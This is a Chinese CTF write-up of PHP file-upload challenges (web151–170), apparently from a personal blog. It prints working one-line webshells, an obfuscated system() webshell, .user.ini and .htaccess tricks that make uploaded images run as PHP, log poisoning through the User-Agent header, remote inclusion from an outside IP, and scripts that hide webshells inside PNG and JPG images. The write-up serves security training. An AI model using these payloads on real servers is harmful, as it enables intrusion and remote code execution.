---
title: Web入门_文件上传
author: Creexile
date: 2024-08-02 23:29:26
lastMod: 2025-08-29
summary: ''
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [RCE, PHP, 文件上传, CTF]
---

# 文件上传

---

web151-170

## web151

- 描述: 新的起点，加油！

![image-20240802105705403](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802105705403.png)

查看源码发现要求文件后缀只能是png, 但是是前端验证, 上传包含木马的png然后抓包修改后缀为php即可

![image-20240802110307408](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802110307408.png)

蚁剑或者hackbar执行命令

```
URL:
/upload/shell.php
payload:
system("tac ../flag.php");
```

## web152

- 描述: 后端不能单一校验

还是限定png, 尝试上传, 发现如果仅更改文件后缀名为php依然可以上传成功, 可能是上一题本来是修改前端代码改为允许php

测试后得知验证的是`Content-Type`, 修改为`image/png`即可绕过后端验证(是叫做校验MIME吧)

payload同上一题

> 直接修改请求包的`Host`就可以了, 不需要开环境重新劫持

## web153

- 描述: 同上

这次验证的是文件名, 可以用大小写绕过, 但是不能解析, 只能将文件下载下来, 换一种方法(php3之类的也不行)

![image-20240802112532008](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802112532008.png)

但是没有内容校验, 可能可以利用`.user.ini`, 详情见[官方文档](https://www.php.net/manual/zh/configuration.file.per-user.php); 似乎说在当前目录下有php文件才会启用用户INI文件, 而在`/upload/`下刚好有一个`index.php`

现在查看配置项看看哪些可以利用, 结合题目, 应该是要文件包含

- auto_append_file
- auto_prepend_file

> 这两个函数作用是指定一个文件, 这个文件会被包含在被执行的php文件中
>
> 区别在于`auto_prepend_file`是在文件前插入；`auto_append_file`在文件最后插入（文件末尾有`exit()`时该设置无效)

`.user.ini`内容如下

```ini
auto_prepend_file=shell.jpg
```

修改前端代码:

```html
<button
  type="button"
  class="layui-btn"
  id="upload"
  lay-data="{url: 'upload.php', accept: 'file'}"
></button>
```

上传, 修改`Content-Type`为`image/png`

![image-20240802123201768](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802123201768.png)

然后上传要包含的文件, 访问`/upload/`尝试执行命令, 成功

![image-20240802123741560](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802123741560.png)

## web154

- 描述: 后端不能单二校验

文件内容和后缀校验, 不能有php

还是上传`.user.ini`, 然后上传短标签一句话木马

```php
<?=eval($_POST['a']);?>
```

![image-20240802132959314](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802132959314.png)

访问`/upload/`执行命令即可

```php
system("tac ../flag.php");
```

> 可以用蚁剑连接查看upload.php
>
> 如果查看不了可以执行`system("cp ../upload.php ../2.txt");`, 访问即可

## web155

- 描述: 后端不能单三校验

web154的步骤可以直接用

## web156

- 描述: 后端不能单四校验

在web154的基础上过滤了文件内容中的中括号, 用大括号绕过即可

![image-20240802141715095](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802141715095.png)

## web157

- 描述: 后端不能单五校验

在web156的基础上过滤了分号, 现在有两种方法:

**直接写入命令, 在被包含的时候执行**或者**改变一句话木马的构造**

> 可以利用本地php环境验证一句话木马可行性

新的一句话木马如下, 利用web154方法先传入`.user.ini`然后包含该文件即可

```php
<?=eval(array_pop($_POST))?>
```

![image-20240802142838578](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802142838578.png)

直接执行命令payload如下, 问就是flag一直在根目录

```php
<?=system("tac /var/www/html/flag.???")?>
<?=system("tac ../flag.???")?>
```

## web158

- 描述: 后端不能单六校验

同样用web157的换一句话木马的方法即可拿到flag

查看`upload.php`发现禁止了log, 看来上一题还可以用日志包含进行getshell

## web159

- 描述: 师傅们可以的

在web158基础上, 括号也没了; 如果没有能执行的函数, 那就尝试包含可写的文件, 只有日志包含了; 或者可以用反引号执行命令:

```php
<?=`tac ../flag.???`?>
```

包含日志可以构造如下命令

```php
<?=include '/var/l'.'og/nginx/access.l'.'og'?>
```

![image-20240802165200134](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802165200134.png)

访问首页然后在User-Agent中写马, 再访问`/upload/`执行命令

![image-20240802165540742](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802165540742.png)

## web160

- 描述: 同上

反引号, 空格没了

但是日志包含还能继续用, 可以用换行符代替空格, 或者直接删除空格即可

## web161

- 描述: 狮虎们轻点，嘤嘤嘤

现在`.user.ini`都传不上去了, 但是加上GIF头即可上传(问就是PNG头太麻烦了)

![image-20240802180342439](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802180342439.png)

然后上传图片马的包也是在前面加上GIF头即可, 其余步骤和web160相同

## web162

- 描述: 姿势挺多的啊？啊？

现在连`.`都过滤了, `.user.ini`包含的文件现在不能有任何后缀

据说是session文件包含, 但是条件竞争是有时间限制的(平台规定), 还是看看我们的远程文件包含吧

因为不能有数字, 所以用的是长数字IP, [转换网址](https://www.bejson.com/convert/ip2int/)

上传远程调用文件, 然后包含即可

```php
GIF89a
<?=include"http://数字IP/shell"?>
```

## web163

- 描述: 玉石俱焚

上传上去的文件似乎马上就被删除了, 现在有两种(?)方法:

1. 条件竞争
   上传然后抢在删除之前包含
2. 远程包含
   直接在`.user.ini`里面包含

> 其实可以让被包含的文件被执行的时候生成一个新的木马?但是也是要条件竞争

还是选择了远程包含, 这次不用再上传其他文件了, 访问`/upload/`即可

```ini
GIF89a
auto_prepend_file=http://数字IP/shell
```

## web164

- 描述: 改头换面

怎么都上传不上去, 但是在上传正常文件查看后发现有疑似图片包含点:

```
url/download.php?image=xxx.png
```

似乎是图片二次渲染上传, [文件上传之图片二次渲染上传](https://blog.csdn.net/2301_79299101/article/details/134295885)

上传之后拉下来利用010 Editor对比十六进制, 然后修改相同的地方, 填入一句话木马啥的

但是我比较懒, 直接用脚本跑更快; `php 1.php`运行文件, 得到一个新的png

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');	// 要修改的图片的路径
/* <?$_GET[0]($_POST[1]);?> 不用多行注释会导致这里?>有效
*/
?>
```

然后根据脚本的构造, 执行命令方式如下:

```
GET:
&0=system
POST:
1=ls
```

但是回显是以图片形式, 没法直接显示在屏幕上, 所以要通过抓包的方式得到回显:

![image-20240802221327124](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802221327124.png)

## web165

- 描述: 改头换面2.0

提供的脚本跑了好多次都没跑出来有用的, 暂时放了

运行方式: `php payload.php test.jpg`, 其中test.jpg是正常的jpg文件

传参方式: POST传参且参数为1

> 先将一个jpg图片上传, 让服务器对其进行一次二次渲染, 我们下载经过二次渲染后的图片, 用渲染后的图片通过脚本来插入payload, 这样被注释掉的概率会降低一点

```php
<?php
    /*
    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.
    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>
    In case of successful injection you will get a specially crafted image, which should be uploaded again.
    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
    Sergey Bobrov @Black2Fan.
    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
    */

    $miniPayload = "<?=eval(\$_POST[1]);?>"; //注意$转义


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    str_repeat("\0",$nullbytePayloadSize) .
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream =
                        substr($outStream, 0, $startPos) .
                        $miniPayload .
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

## web166

- 描述: 刻骨铭心

现在限定是zip文件, 传上去试试, 发现也是疑似包含(download?file=...)

那么尝试在zip末尾添加一句话木马(winhex), 抓下载的包即可执行命令(下载时zip文件会进行文件包含):

![image-20240802223111282](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802223111282.png)

> 推荐用GET方式传参的木马

## web167

- 描述: httpd

应该是`.htaccess`中的`application/x-httpd-php`

```htaccess
# 面向所有对应后缀的
AddType application/x-httpd-php .jpg

# 面向特定文件(可行)
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

这次限定的是jpg文件, 将一句话木马修改后缀为jpg后发现可以直接上传

但是下载文件直接变成了查看文件本体而不是包含文件(我甚至抓不到包), 所以还是得传`.htaccess`, 记得改改前端代码

```html
<button
  type="button"
  class="layui-btn"
  id="upload"
  lay-data="{url: 'upload.php', accept: 'file'}"
></button>
```

改一下`Content-Type`

![image-20240802224606418](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802224606418.png)

现在再访问`/upload/shell.jpg`应该是一片空白而不是一张图片, 然后就可以命令执行了

## web168

- 描述: 基础免杀

前端这次限定png, 上传之后没有给上传路径, 但是还是在`/upload/1.png`中; 然后如果不符合条件, 程序只会返回null

在抓上传包和改包的时候发现没有限制后缀, 可以传入php文件; 试探了半天发现直接写命令都是无所谓的, 最后在上一层目录中找到另一个flagaa.php, payload如下:

```php
<?=`tac ../flagaa.php`?>
```

![image-20240802230556490](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802230556490.png)

当然还有构造木马的:

```php
<?php
$a = "s#y#s#t#e#m";
$b = explode("#",$a);
$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
$c($_REQUEST[1]);
?>
```

## web169

- 高级免杀

前端这次限定为zip文件, 但是不管那么多, 抓包测试发现可以直接写php文件, 同时过滤了`<`; 此时考虑日志包含, 远程文件包含, 配置文件(这里就用配置文件+日志包含了)

首先, 配置文件生效要求必须有一个主php文件, 而本题没有, 此时可以利用写php文件的上传一个`index.php`, 此时再访问`/upload/`就会显示写的php文件

![image-20240802231618166](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240802231618166.png)

然后配置文件如下:

```ini
auto_prepend_file=/var/log/nginx/access.log
```

此时再访问`/upload/`就可以看到日志文件, 接下来的操作如出一辙, UA头写马然后包含执行命令

> 不知道哪题可以试下auto_append_file=php://input

## web170

- 描述: 终极免杀

前端限定为zip, 一样没有`/upload/`, 先试试web169的方法, 发现可以用, 那就结束了

相关文件:

- [[../../../渗透/渗透思路/文件上传_思路]]
